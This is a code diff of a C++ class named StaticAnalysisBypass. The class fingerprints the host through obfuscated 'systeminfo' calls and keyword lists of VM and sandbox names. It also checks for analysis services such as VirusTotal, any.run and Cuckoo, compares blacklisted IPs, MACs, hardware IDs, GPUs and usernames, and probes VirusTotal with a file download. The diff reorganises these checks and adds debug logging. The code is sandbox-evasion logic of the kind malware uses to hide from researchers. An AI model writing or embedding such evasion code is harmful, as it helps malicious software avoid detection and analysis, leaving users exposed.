@@ -120,8 +120,7 @@ bool StaticAnalysisBypass::DetectEnvironment()
 {
     std::string              system_info = executeCommand(skCrypt("systeminfo"));
     std::vector<std::string> vm_indicators = {"VBOX", "VIRTUALBOX", "VMWARE", "XEN", "QEMU", "VIRTUAL", "HYPERVISOR", "SBOX", "SANDBOX", "CWSANDBOX"};
-    std::vector<std::string> analysis_indicators = {"virustotal",  "hybrid-analysis", "cuckoo",       "malwr",     "any.run", "reverse.it", "joe sandbox", "threatgrid",
-        "cape sandbox", "totalhash",       "intezer", "ahnlab", "AhnLab"};
+    std::vector<std::string> analysis_indicators = {"virustotal", "hybrid-analysis", "cuckoo",    "malwr",   "any.run", "reverse.it", "joe sandbox", "threatgrid", "cape sandbox",    "totalhash", "intezer", "ahnlab",  "AhnLab"};
 
     for (const auto& indicator : vm_indicators)
     {
@@ -134,27 +133,72 @@ bool StaticAnalysisBypass::DetectEnvironment()
         if (system_info.find(indicator) != std::string::npos)
             return true;
     }
-    
+
     HRESULT hr = URLDownloadToFile(NULL, "https://www.virustotal.com/", "\\x.txt", 0, NULL);
     return hr != S_OK;
 }
 
 bool StaticAnalysisBypass::IsAnalysisVM()
 {
+    // Detect common analysis VMs and blacklisted hardware and log a number indicates the detection
+
     std::string ip_address = GetIPAddress();
     std::string mac_address = GetMACAddress();
     std::string hwid = GetHWID();
     std::string gpu = GetGPUInfo();
     std::string username = GetUsername();
 
-    if (DetectEnvironment() || std::find(blacklisted_ips.begin(), blacklisted_ips.end(), ip_address) != blacklisted_ips.end() ||
-        std::find(blacklisted_macs.begin(), blacklisted_macs.end(), mac_address) != blacklisted_macs.end() ||
-        std::find(blacklisted_hwids.begin(), blacklisted_hwids.end(), hwid) != blacklisted_hwids.end() ||
-        std::find(blacklisted_gpus.begin(), blacklisted_gpus.end(), gpu) != blacklisted_gpus.end() ||
-        std::find(blacklistUsers.begin(), blacklistUsers.end(), username) != blacklistUsers.end())
+    if (DetectEnvironment())
     {
+        SharedUtil::AddDebugLog("Environment detection triggered");
         return true;
     }
 
+    for (const auto& bannedGpu : blacklisted_gpus)
+    {
+        if (gpu.find(bannedGpu) != std::string::npos)
+        {
+            SharedUtil::AddDebugLog("Detected 1");
+            return true;
+        }
+    }
+
+    for (const auto& bannedHwid : blacklisted_hwids)
+    {
+        if (hwid.find(bannedHwid) != std::string::npos)
+        {
+            SharedUtil::AddDebugLog("Detected 2");
+            return true;
+        }
+    }
+
+    for (const auto& bannedIp : blacklisted_ips)
+    {
+        if (ip_address.find(bannedIp) != std::string::npos)
+        {
+            SharedUtil::AddDebugLog("Detected 3");
+            return true;
+        }
+    }
+
+    for (const auto& bannedMac : blacklisted_macs)
+    {
+        if (mac_address.find(bannedMac) != std::string::npos)
+        {
+            SharedUtil::AddDebugLog("Detected 4");
+            return true;
+        }
+    }
+
+    for (const auto& bannedUser : blacklistUsers)
+    {
+        if (username.find(bannedUser) != std::string::npos)
+        {
+            SharedUtil::AddDebugLog("Detected 5");
+            return true;
+        }
+    }
     return false;
+
+    // return false;
 }
